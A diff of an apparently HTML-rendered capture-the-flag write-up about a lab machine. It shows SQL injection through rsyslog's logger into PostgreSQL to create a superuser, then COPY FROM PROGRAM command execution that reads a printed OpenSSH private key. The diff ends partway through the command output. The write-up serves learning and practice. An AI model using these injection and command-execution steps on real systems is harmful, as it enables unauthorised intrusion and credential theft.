-  property<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s2">&#34;timereported&#34;</span> <span class="nv">dateformat</span><span class="o">=</span><span class="s2">&#34;pgsql&#34;</span> date.inUTC<span class="o">=</span><span class="s2">&#34;on&#34;</span><span class="o">)</span>
-  constant<span class="o">(</span><span class="nv">value</span><span class="o">=</span><span class="s2">&#34;&#39;)&#34;</span><span class="o">)</span>
-<span class="o">}</span>
-<span class="c1"># load module</span>
-module<span class="o">(</span><span class="nv">load</span><span class="o">=</span><span class="s2">&#34;ompgsql&#34;</span><span class="o">)</span>
-
-<span class="c1">#Only forward local7.info for testing.</span>
-local7.info action<span class="o">(</span><span class="nv">type</span><span class="o">=</span><span class="s2">&#34;ompgsql&#34;</span> <span class="nv">server</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">user</span><span class="o">=</span><span class="s2">&#34;postgres&#34;</span> <span class="nv">pass</span><span class="o">=</span><span class="s2">&#34;test1234&#34;</span> <span class="nv">db</span><span class="o">=</span><span class="s2">&#34;syslog&#34;</span> <span class="nv">template</span><span class="o">=</span><span class="s2">&#34;sql-syslog&#34;</span><span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">roy@zetta:/tmp/.git$ cat pgsql.conf
+</span></span><span class="line"><span class="cl"><span class="c1">### Configuration file for rsyslog-pgsql</span>
+</span></span><span class="line"><span class="cl"><span class="c1">### Changes are preserved</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Used default template from documentation/source but adapted table</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># name to syslog_lines so the Ruby on Rails application Maurice is</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># coding can use this as SyslogLine object.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># template(name=&#34;sql-syslog&#34; type=&#34;list&#34; option.sql=&#34;on&#34;) {</span>
+</span></span><span class="line"><span class="cl">  constant<span class="o">(</span><span class="nv">value</span><span class="o">=</span><span class="s2">&#34;INSERT INTO syslog_lines (message, devicereportedtime) values (&#39;&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  property<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s2">&#34;msg&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  constant<span class="o">(</span><span class="nv">value</span><span class="o">=</span><span class="s2">&#34;&#39;,&#39;&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  property<span class="o">(</span><span class="nv">name</span><span class="o">=</span><span class="s2">&#34;timereported&#34;</span> <span class="nv">dateformat</span><span class="o">=</span><span class="s2">&#34;pgsql&#34;</span> date.inUTC<span class="o">=</span><span class="s2">&#34;on&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">  constant<span class="o">(</span><span class="nv">value</span><span class="o">=</span><span class="s2">&#34;&#39;)&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># load module</span>
+</span></span><span class="line"><span class="cl">module<span class="o">(</span><span class="nv">load</span><span class="o">=</span><span class="s2">&#34;ompgsql&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Only forward local7.info for testing.</span>
+</span></span><span class="line"><span class="cl">local7.info action<span class="o">(</span><span class="nv">type</span><span class="o">=</span><span class="s2">&#34;ompgsql&#34;</span> <span class="nv">server</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">user</span><span class="o">=</span><span class="s2">&#34;postgres&#34;</span> <span class="nv">pass</span><span class="o">=</span><span class="s2">&#34;test1234&#34;</span> <span class="nv">db</span><span class="o">=</span><span class="s2">&#34;syslog&#34;</span> <span class="nv">template</span><span class="o">=</span><span class="s2">&#34;sql-syslog&#34;</span><span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Since there was sql in syslog postgres I tried to get the shell of postgres for that I used command as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">roy@zetta:/tmp/.git$ psql -d syslog
-psql: FATAL:  role <span class="s2">&#34;roy&#34;</span> does not exist
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">roy@zetta:/tmp/.git$ psql -d syslog
+</span></span><span class="line"><span class="cl">psql: FATAL:  role <span class="s2">&#34;roy&#34;</span> does not exist
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>where -d, &ndash;dbname=DBNAME   database name to connect to (default: &ldquo;roy&rdquo;)</p>
 <p>So,for that I tried to create the user roy using postgres, logger and sql injection so my payload was</p>
 <h2 id="logger---sql---superuser-roy">Logger -&gt; Sql -&gt; Superuser roy</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -733,30 +666,30 @@ psql: FATAL:  role <span class="s2">&#34;roy&#34;</span> does not exist
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">roy@zetta:~$ logger -p local7.info <span class="s2">&#34;aaa&#39;,current_timestamp);CREATE USER roy; --&#34;</span>
-roy@zetta:~$ psql -d syslog
-psql <span class="o">(</span>11.4 <span class="o">(</span>Debian 11.4-1<span class="o">))</span>
-Type <span class="s2">&#34;help&#34;</span> <span class="k">for</span> help.
-
-<span class="nv">syslog</span><span class="o">=</span>&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">roy@zetta:~$ logger -p local7.info <span class="s2">&#34;aaa&#39;,current_timestamp);CREATE USER roy; --&#34;</span>
+</span></span><span class="line"><span class="cl">roy@zetta:~$ psql -d syslog
+</span></span><span class="line"><span class="cl">psql <span class="o">(</span>11.4 <span class="o">(</span>Debian 11.4-1<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Type <span class="s2">&#34;help&#34;</span> <span class="k">for</span> help.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">syslog</span><span class="o">=</span>&gt;
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p>After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got <code>COPY FROM PROGRAM Command Execution vulnerability</code>. For more info about it you can click <a href="https://www.exploit-db.com/exploits/46813" target="_blank" rel="noopener noreffer">here</a>.</p>
-<p>And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/" target="_blank" rel="noopener noreffer">here</a>.</p>
+</div><p>After that, I created the user roy for syslog and used the postgres command to see what things are inside the syslog database. Since this box got postgres I googled for latest exploit of postgresql and got <code>COPY FROM PROGRAM Command Execution vulnerability</code>. For more info about it you can click <a href="https://www.exploit-db.com/exploits/46813" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<p>And instead of using Metasploit I used the manual ways to exploit this vulnerability for that I used this blog <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/" target="_blank" rel="noopener noreffer ">here</a>.</p>
 <p>On reading blogs to use <code>COPY</code> command user must be superuser only then I can exploit it. For that I changed the user <em>roy</em> to superuser as</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">roy@zetta:~$ logger -p local7.info &#34;aaa&#39;,current_timestamp);ALTER USER roy WITH SUPERUSER; --&#34;                                                             
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">roy@zetta:~$ logger -p local7.info &#34;aaa&#39;,current_timestamp);ALTER USER roy WITH SUPERUSER; --&#34;                                                             
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Now I exploit the postgres and able to run the command injection in syslog database. At my first attempt I was interrupted and unable to run command in postgres but after 2nd/3rd attempt I used (<code>$$</code>)Dollar-quoting for escaping single quotes in postgres to exploit command injection.</p>
 <h2 id="command-injection---postgres-shell">Command Injection -&gt; Postgres shell</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -768,23 +701,23 @@ Type <span class="s2">&#34;help&#34;</span> <span class="k">for</span> help.
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">syslog</span><span class="o">=</span><span class="c1"># CREATE TABLE RCE(RCE text);
-</span><span class="c1"></span><span class="k">CREATE</span> <span class="k">TABLE</span>
-<span class="n">syslog</span><span class="o">=</span><span class="c1"># COPY RCE FROM PROGRAM $$id$$; 
-</span><span class="c1"></span><span class="n">COPY</span> <span class="mi">1</span>
-<span class="n">syslog</span><span class="o">=</span><span class="c1"># SELECT * FROM RCE;
-</span><span class="c1"></span>                                  <span class="n">rce</span>                                   
-<span class="o">----------------------------------------------------------------------</span><span class="c1">--
-</span><span class="c1"> postgres
-</span><span class="c1"></span> <span class="n">uid</span><span class="o">=</span><span class="mi">106</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">112</span><span class="p">(</span><span class="k">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span>
-<span class="p">(</span><span class="mi">2</span> <span class="n">rows</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">syslog</span><span class="o">=</span><span class="c1"># CREATE TABLE RCE(RCE text);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">syslog</span><span class="o">=</span><span class="c1"># COPY RCE FROM PROGRAM $$id$$; 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">COPY</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">syslog</span><span class="o">=</span><span class="c1"># SELECT * FROM RCE;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">                                  </span><span class="n">rce</span><span class="w">                                   
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">----------------------------------------------------------------------</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"> postgres
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="n">uid</span><span class="o">=</span><span class="mi">106</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">112</span><span class="p">(</span><span class="k">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">(</span><span class="mi">2</span><span class="w"> </span><span class="n">rows</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>Now I have to get the postgres shell for that I should have id_rsa key. Now for that I found the <code>id_rsa</code> key of postgres in directory <code>/var/lib/postgres/.ssh/</code>
 So for that I used that cat command in command injection and able to cat the RSA key.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -856,82 +789,82 @@ So for that I used that cat command in command injection and able to cat the RSA
 </span><span class="lnt">70
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">syslog</span><span class="o">=</span><span class="c1"># COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$;                                                                                                
-</span><span class="c1"></span><span class="n">COPY</span> <span class="mi">6</span>                                                                                                                                                
-<span class="n">syslog</span><span class="o">=</span><span class="c1"># SELECT * FROM RCE;                                                                                                                           
-</span><span class="c1"></span>                                     <span class="n">rce</span>                                                                                                              
-<span class="o">----------------------------------------------------------------------------</span><span class="c1">--
-</span><span class="c1"> postgres
-</span><span class="c1"></span> <span class="n">uid</span><span class="o">=</span><span class="mi">106</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">112</span><span class="p">(</span><span class="k">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span>
- <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="n">main</span>
- <span class="n">total</span> <span class="mi">20</span>
- <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">4</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">27</span>  <span class="mi">2019</span> <span class="p">.</span>
- <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">27</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">4096</span> <span class="n">Aug</span> <span class="mi">27</span> <span class="mi">05</span><span class="p">:</span><span class="mi">39</span> <span class="p">..</span>
- <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">27</span>  <span class="mi">2019</span> <span class="mi">11</span>
- <span class="n">lrwxrwxrwx</span>  <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>        <span class="mi">9</span> <span class="n">Jul</span> <span class="mi">27</span>  <span class="mi">2019</span> <span class="p">.</span><span class="n">bash_history</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
- <span class="o">-</span><span class="n">rw</span><span class="o">-----</span><span class="c1">--  1 postgres postgres  744 Jul 27  2019 .psql_history
-</span><span class="c1"></span> <span class="n">drwx</span><span class="o">----</span><span class="c1">--  2 postgres postgres 4096 Jul 27  2019 .ssh
-</span><span class="c1"></span> <span class="n">total</span> <span class="mi">20</span>
- <span class="n">drwx</span><span class="o">----</span><span class="c1">-- 2 postgres postgres 4096 Jul 27  2019 .
-</span><span class="c1"></span> <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">postgres</span> <span class="n">postgres</span> <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">27</span>  <span class="mi">2019</span> <span class="p">..</span>
- <span class="o">-</span><span class="n">rw</span><span class="o">-----</span><span class="c1">-- 1 postgres postgres  747 Jul 27  2019 authorized_keys
-</span><span class="c1"></span> <span class="o">-</span><span class="n">rw</span><span class="o">-----</span><span class="c1">-- 1 postgres postgres 3389 Jul 27  2019 id_rsa
-</span><span class="c1"></span> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="c1">-- 1 postgres postgres  747 Jul 27  2019 id_rsa.pub
-</span><span class="c1"></span> <span class="o">-----</span><span class="n">BEGIN</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="k">KEY</span><span class="o">---</span><span class="c1">--
-</span><span class="c1">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
-</span><span class="c1"></span><span class="n">NhAAAAAwEAAQAAAgEAxyTwk</span><span class="o">/</span><span class="n">nCdFnnjTEyl8ShdNbEzcYLGv4qGAi</span><span class="o">+</span><span class="n">EuZd1XnqgsUQH1qu</span>
-<span class="n">wPwA2ytXyaz27qkkjs3y6lEtu3w4DBwXycqk3DMe</span><span class="o">/</span><span class="mi">5</span><span class="n">ir6JCtsV2</span><span class="o">+</span><span class="n">GnNFJxUfpF3X05lmqg</span>
-<span class="mi">1</span><span class="n">Ua6rnyjYVmi4t6BxxoCvOd</span><span class="o">/</span><span class="n">X8WORcOselG9RZwk</span><span class="o">//</span><span class="n">gjIsElappX</span><span class="o">/</span><span class="n">flotyXdgEd0uyx6Ul</span>
-<span class="n">gXFb9WeX2EfSd3D8HpyclYhkaVq7ng0yzJAvF4hbEqMq1ERW</span><span class="o">/</span><span class="n">weWyE32XvDKb</span><span class="o">+</span><span class="n">aHLY44UB</span>
-<span class="n">iCQhdrIdiY3ctek4VUlBnCzULD4btFwrZyvxvrq</span><span class="o">+</span><span class="n">ievIEJtU3o3z6zh</span><span class="o">+</span><span class="n">s9</span><span class="o">/</span><span class="n">CQ0vze9ylXp</span>
-<span class="n">eceLFaoPr2BcPsSLmld9ac3O9263sgTNYWVG</span><span class="o">+</span><span class="n">g6TQvV</span><span class="o">+</span><span class="n">Un7Ut8Ap9OctDCzjw2Q8xU</span><span class="o">/</span><span class="n">cpt</span>
-<span class="n">ebWCkMhAgSGSNwxodztd1x9PqY0Vrje3aCSvlgP8tyl9FxXxA5fg4JvmAlhKLhAhtpFTs9</span>
-<span class="mi">3</span><span class="n">Xro6Vcz8BGdOXOIqlaKbOTj2YmsI</span><span class="o">+</span><span class="n">exxzI7pl3gKtF6</span><span class="o">/</span><span class="n">vLu</span><span class="o">/</span><span class="n">kUQl2r</span><span class="o">/</span><span class="n">eXhW</span><span class="o">+</span><span class="n">seY7AsfUG</span>
-<span class="n">J6zOtUBgfSzYG6gqQr2tah7cbG6qCYwt9ShqgAshWZV66Y94nyZibYwTOPq7LvxJmIMLlJ</span>
-<span class="mi">9</span><span class="n">xwbWRhLq7V</span><span class="o">+</span><span class="n">xvIB5eObmkjVVfnsz71XtXVI4wRBZ9s</span><span class="o">+</span><span class="n">vrTcZiwrCI228IWFaOCbwr8e4N</span>
-<span class="n">MAAAdQUkfH2VJHx9kAAAAHc3NoLXJzYQAAAgEAxyTwk</span><span class="o">/</span><span class="n">nCdFnnjTEyl8ShdNbEzcYLGv4q</span>
-<span class="n">GAi</span><span class="o">+</span><span class="n">EuZd1XnqgsUQH1quwPwA2ytXyaz27qkkjs3y6lEtu3w4DBwXycqk3DMe</span><span class="o">/</span><span class="mi">5</span><span class="n">ir6JCtsV</span>
-<span class="mi">2</span><span class="o">+</span><span class="n">GnNFJxUfpF3X05lmqg1Ua6rnyjYVmi4t6BxxoCvOd</span><span class="o">/</span><span class="n">X8WORcOselG9RZwk</span><span class="o">//</span><span class="n">gjIsElap</span>
-<span class="n">pX</span><span class="o">/</span><span class="n">flotyXdgEd0uyx6UlgXFb9WeX2EfSd3D8HpyclYhkaVq7ng0yzJAvF4hbEqMq1ERW</span><span class="o">/</span><span class="n">w</span>
-<span class="n">eWyE32XvDKb</span><span class="o">+</span><span class="n">aHLY44UBiCQhdrIdiY3ctek4VUlBnCzULD4btFwrZyvxvrq</span><span class="o">+</span><span class="n">ievIEJtU3o</span>
-<span class="mi">3</span><span class="n">z6zh</span><span class="o">+</span><span class="n">s9</span><span class="o">/</span><span class="n">CQ0vze9ylXpeceLFaoPr2BcPsSLmld9ac3O9263sgTNYWVG</span><span class="o">+</span><span class="n">g6TQvV</span><span class="o">+</span><span class="n">Un7Ut8</span>
-<span class="n">Ap9OctDCzjw2Q8xU</span><span class="o">/</span><span class="n">cptebWCkMhAgSGSNwxodztd1x9PqY0Vrje3aCSvlgP8tyl9FxXxA5</span>
-<span class="n">fg4JvmAlhKLhAhtpFTs93Xro6Vcz8BGdOXOIqlaKbOTj2YmsI</span><span class="o">+</span><span class="n">exxzI7pl3gKtF6</span><span class="o">/</span><span class="n">vLu</span><span class="o">/</span><span class="n">k</span>
-<span class="n">UQl2r</span><span class="o">/</span><span class="n">eXhW</span><span class="o">+</span><span class="n">seY7AsfUGJ6zOtUBgfSzYG6gqQr2tah7cbG6qCYwt9ShqgAshWZV66Y94ny</span>
-<span class="n">ZibYwTOPq7LvxJmIMLlJ9xwbWRhLq7V</span><span class="o">+</span><span class="n">xvIB5eObmkjVVfnsz71XtXVI4wRBZ9s</span><span class="o">+</span><span class="n">vrTcZi</span>
-<span class="n">wrCI228IWFaOCbwr8e4NMAAAADAQABAAACAQDFo</span><span class="o">+</span><span class="n">Gn2o6kjr2BoTwG570dijDT0CMhbPI1</span>
-<span class="mi">3</span><span class="n">CdX9o1V2qNlmVJA6</span><span class="o">+</span><span class="n">zX1sK6wa9klmaTwgZoO</span><span class="o">/</span><span class="n">lDl8F9evDdA9yQBq</span><span class="o">/</span><span class="n">LYmj3XnvuWfgoOV</span>
-<span class="n">L8ST5uZUZ8CC608F</span><span class="o">+</span><span class="mi">1</span><span class="n">kXkhSgK06yxRUld5LxGN1ywYXmdNiYYHSDCTCBL1CBQbENQwdxXz</span>
-<span class="n">DI</span><span class="o">/</span><span class="n">Ihyi</span><span class="o">//</span><span class="n">i2gf940ybAJYYnUajWHDvDQXa</span><span class="o">+</span><span class="mi">6</span><span class="n">ac</span><span class="o">/</span><span class="mi">1</span><span class="n">j</span><span class="o">+</span><span class="n">GntcbSO2MZJle2UTuhqZJODG0Sum</span>
-<span class="n">No9Ab5fpxKpk2uZqF4zHoqQbevZZmBNd7tJbwlJ9Pvhr2FAClh71S</span><span class="o">+</span><span class="n">WmVwvXMcviv2ZhYh</span>
-<span class="n">yca</span><span class="o">/</span><span class="n">tDZWUVCQHjAb6VvH4sQkgh0BPdY8nH52FWCWA0KZUvFWtzn5gZwHw</span><span class="o">+</span><span class="n">JMtNRMnoNyR3</span>
-<span class="n">wKLbRHAluUnEZZ6xFoo1UiWyYe3Yps0ARmuBMCQSnFq3QWRi9h7feja5g1cjGg27At2</span><span class="o">+</span><span class="n">yR</span>
-<span class="mi">18</span><span class="n">bPkb98faep</span><span class="o">/</span><span class="n">kFld7Aja2z67SdAL2uB</span><span class="o">+</span><span class="n">V2uwKwLd46hmA0HEK0hAi0PaPfXEDQXyZZhZX</span>
-<span class="o">+</span><span class="n">s1vqVsWwrLUeUfR2wi</span><span class="o">+</span><span class="n">vDQDGeGm20Mb1ZlcDdQHLiF6addRcuDK0DjBD2UTDjKHaKH</span><span class="o">/</span><span class="n">pf</span>
-<span class="n">EGTNwPLHWoix</span><span class="o">/</span><span class="n">Ua</span><span class="o">+</span><span class="n">JZHdEpScmqkz</span><span class="o">/</span><span class="n">bgxJWclI0vN</span><span class="o">+</span><span class="n">KGwoK9scii</span><span class="o">+</span><span class="mi">0</span><span class="n">rF9DR7q</span><span class="o">+</span><span class="n">Vlujy</span><span class="o">+</span><span class="n">vUw</span>
-<span class="n">fYekfcNde2heW09mzQwQAAAQAKJJlsB4rpRS2jDN8YNa6Tlv6</span><span class="o">/</span><span class="n">yrQ</span><span class="o">/</span><span class="n">zQm3XyqNHVmLVred</span>
-<span class="n">gLrlTsCn5I2pumroQ0ikY6KwHqo</span><span class="o">/</span><span class="n">SZBdLARf3SKUW8C7RFsfPleT4</span><span class="o">/</span><span class="n">wz4FVvPrvnRt1x25</span>
-<span class="n">wEtzpEXzwcM</span><span class="o">+</span><span class="mi">0</span><span class="n">bvrnCle2</span><span class="o">/</span><span class="n">WO93i9</span><span class="o">/</span><span class="n">ngkaoq</span><span class="o">+</span><span class="n">eAyzUUbhtJ4D</span><span class="o">++</span><span class="n">KjkSgEybQO49Mm2NmFMz</span>
-<span class="n">vuMUKfIK5GOD1owJTFCobVKoyju85kWv28wYZyOr2Hb3HgERsm746SzoIZ6GDyTGonK0aw</span>
-<span class="mi">8</span><span class="n">h7HZk52iiJfBtMkk5MU65iprMOE27b5PSADTQmepq7pgABRWyY3c8v3W</span><span class="o">+</span><span class="n">DvtFCsVzxchs</span>
-<span class="n">ElVpgNReaNX0Lg4iAAABAQDwvf4twBUem54a</span><span class="o">/</span><span class="n">SpQTEOZA3</span><span class="o">/</span><span class="mi">1</span><span class="n">oqJlsG14XUUV9drjT</span><span class="o">/</span><span class="mi">6</span><span class="n">dNy</span>
-<span class="n">zWIJaFGS3NObB1AsXYpIN6dOn0q12kRVH9OTUhFF9Ou3Wm6uytNVhpJOic3y09egJ</span><span class="o">/</span><span class="n">U9wM</span>
-<span class="n">tiymf8DxHhVx3mEX3Qr2GHPN6n3eYce</span><span class="o">+/</span><span class="n">JGaNugR2</span><span class="o">+</span><span class="mi">1</span><span class="n">keUk76orwN2paENfyuqAg4</span><span class="o">/</span><span class="n">k8</span><span class="o">/</span><span class="n">w</span>
-<span class="n">zDYvIzNsK0A8aiJ4hctJxHl4mlXwO0oGNtNFBUIrov4iI8P6gghzsNPGsuyTfBPayFBCF4</span>
-<span class="mi">8</span><span class="n">nGT1ocY0ItJKfTejPhN7w5pdM6M7bT3uT7cUEGkZANP5AYUfsEhh8kpwsoER9HbKQipvz</span>
-<span class="n">xPSa16LeeciKbDAAABAQDTxAcJANWF</span><span class="o">//</span><span class="n">B58W</span><span class="o">+</span><span class="n">UYGN0DyZfFNljToCqUT71rIDkckyWv5fi</span>
-<span class="n">PbxoQzxhXW6BprnwlqCCnq22fhiJp</span><span class="o">+</span><span class="n">gJE49Ag3BgqW9sCbGFh</span><span class="o">/</span><span class="n">ft09kL</span><span class="o">/</span><span class="n">tv29vDOno32FC</span>
-<span class="n">PAcXDAMuGF46hURvgSjble8Z2ISmkGnV8XZ</span><span class="o">+</span><span class="n">ka</span><span class="o">/</span><span class="n">nqtDQRiZ51GMVgDz</span><span class="o">+</span><span class="n">tjfcrYDqoKO</span><span class="o">/</span><span class="n">r1</span>
-<span class="n">cqBDo5fVoYKc8K0id9cXLTwqD</span><span class="o">+</span><span class="n">W6zT1UCDExNTcwByrqDMSIOmj5FDndwVVg29YP7TUE8i</span>
-<span class="n">GolHzO58rsJVHYuiAGHBooDln7zL6CqmAhKgFUfLoAT</span><span class="o">+</span><span class="n">NRlHiXbltdSxZ7K0SWcNA32Trq</span>
-<span class="n">d5qRdqtIHNyxAAAAFUJhY2t1cCBLZXkgZm9yIEJhcm1hbgECAwQF</span>
-<span class="o">-----</span><span class="n">END</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="k">KEY</span><span class="o">---</span><span class="c1">--
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">syslog</span><span class="o">=</span><span class="c1"># COPY RCE FROM PROGRAM $$cat ../../.ssh/id_rsa$$;                                                                                                
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">COPY</span><span class="w"> </span><span class="mi">6</span><span class="w">                                                                                                                                                
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">syslog</span><span class="o">=</span><span class="c1"># SELECT * FROM RCE;                                                                                                                           
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">                                     </span><span class="n">rce</span><span class="w">                                                                                                              
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">----------------------------------------------------------------------------</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"> postgres
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="n">uid</span><span class="o">=</span><span class="mi">106</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">113</span><span class="p">(</span><span class="n">postgres</span><span class="p">),</span><span class="mi">112</span><span class="p">(</span><span class="k">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="n">main</span><span class="w">
